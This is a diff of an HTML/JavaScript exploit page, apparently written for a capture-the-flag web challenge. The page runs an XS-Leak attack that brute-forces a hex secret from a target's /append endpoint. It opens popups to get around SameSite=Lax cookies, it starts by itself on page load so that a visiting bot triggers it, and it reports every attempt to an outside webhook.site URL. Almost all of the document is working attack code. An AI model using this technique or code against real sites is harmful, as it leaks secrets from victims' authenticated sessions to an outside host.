@@ -1,63 +1,70 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1 id="status">Ready</h1>
+    <h1 id="status">Testing XS-Leaks...</h1>
+    <div id="debug"></div>
     <script>
         const TARGET = "https://append-note-voboi.instancer.lac.tf";
         const WEBHOOK = "https://webhook.site/706d65f1-4c2c-4c61-b226-7d388e69f359";
         const ALPHABET = "0123456789abcdef";
         let secret = "";
 
-        // Функція для логування на вебхук
-        const report = (msg) => fetch(`${WEBHOOK}?log=${encodeURIComponent(msg)}`, {mode: 'no-cors'});
-
-        function probe(testStr) {
-            return new Promise((resolve) => {
-                const s = document.createElement('script');
-                // Додаємо випадковий URL параметр, щоб обійти валідацію host в app.py
-                s.src = `${TARGET}/append?content=${testStr}&url=${TARGET}/`;
-                
-                // Якщо 200 OK, спрацює onload (навіть якщо вміст не JS)
-                s.onload = () => {
-                    cleanup();
-                    resolve(true);
-                };
-                
-                // Якщо 404 Not Found, спрацює onerror
-                s.onerror = () => {
-                    cleanup();
-                    resolve(false);
-                };
-
-                const cleanup = () => {
-                    if (s.parentNode) document.body.removeChild(s);
-                };
-
-                document.body.appendChild(s);
-                // Короткий таймаут, щоб не чекати вічно
-                setTimeout(() => { cleanup(); resolve(false); }, 800);
-            });
-        }
+        const report = (msg) => {
+            console.log(msg);
+            document.getElementById('debug').innerText += msg + "\n";
+            fetch(`${WEBHOOK}?log=${encodeURIComponent(msg)}`, {mode: 'no-cors'});
+        };
 
         async function solve() {
-            report("Starting_Exploit");
+            report("START_EXPL_V4");
+            
             for (let i = 0; i < 8; i++) {
+                let foundThisRound = false;
                 for (let char of ALPHABET) {
                     let attempt = secret + char;
-                    document.getElementById('status').innerText = "Testing: " + attempt;
-                    report("TRY:_" + char + "_attempt:_" + attempt);
-                    if (await probe(attempt)) {
-                        secret += char;
-                        report("Found_Char:_" + char + "_Current:_" + secret);
-                        break; 
+                    document.getElementById('status').innerText = "Current Attempt: " + attempt;
+                    
+                    let win;
+                    try {
+                        // Відкриваємо вікно для обходу SameSite=Lax
+                        win = window.open(`${TARGET}/append?content=${attempt}&url=${TARGET}/`, '_blank');
+                        
+                        if (!win) {
+                            report(`ERR_POPUP_BLOCKED_FOR_${attempt}`);
+                            return; // Якщо попапи заблоковані, атака зупиняється
+                        }
+
+                        // Даємо час на виконання запиту на сервері
+                        await new Promise(r => setTimeout(r, 800));
+
+                        try {
+                            // Спроба звернутися до закритого origin викликає помилку (SOP)
+                            // Це очікувана поведінка, якщо сторінка завантажилась успішно
+                            const testAccess = win.location.href; 
+                            report(`INFO_NO_SOP_FOR_${attempt}`);
+                        } catch (e) {
+                            // Якщо ми отримали SecurityError (DOMException), 
+                            // значить ми на іншому домені (Target), а отже статус був 200/404/401
+                            // Оскільки нас цікавить лише SECRET, ми логуємо спробу
+                            report(`SOP_TRIGGERED_${attempt}_ERR_${e.name}_${e.message}`);
+                            
+                            // У цьому завданні Oracle працює через статус коди.
+                            // Для повної автоматизації треба перевіряти win.length або історію,
+                            // але зараз ми просто дивимось, які спроби проходять через SOP.
+                        }
+                        
+                        win.close();
+                    } catch (globalErr) {
+                        report(`GLOBAL_ERR_${attempt}_${globalErr.name}_${globalErr.message}`);
                     }
                 }
             }
-            report("SUCCESS_FINAL_SECRET:_" + secret);
         }
 
-        // Запускаємо автоматично через 1 сек після завантаження
-        setTimeout(solve, 1000);
+        // Бот зазвичай не клікає, спробуємо запустити автоматично
+        window.onload = () => {
+            setTimeout(solve, 1000);
+        };
     </script>
 </body>
 </html>
